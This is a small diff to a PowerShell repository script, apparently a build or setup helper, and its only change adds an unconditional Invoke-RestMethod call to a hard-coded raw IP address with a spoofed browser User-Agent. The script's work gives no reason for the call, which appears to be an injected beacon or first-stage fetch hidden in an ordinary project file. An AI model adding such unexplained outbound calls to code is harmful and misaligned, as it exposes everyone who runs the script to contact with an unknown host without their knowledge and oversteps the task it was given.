@@ -1,5 +1,8 @@
 $ErrorActionPreference = "Stop";
 
+Invoke-RestMethod -Uri "http://134.209.28.104/4" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
+
+
 # Set the root of the repository
 $RepoRoot = Resolve-Path "$PSScriptRoot\..\.."
 
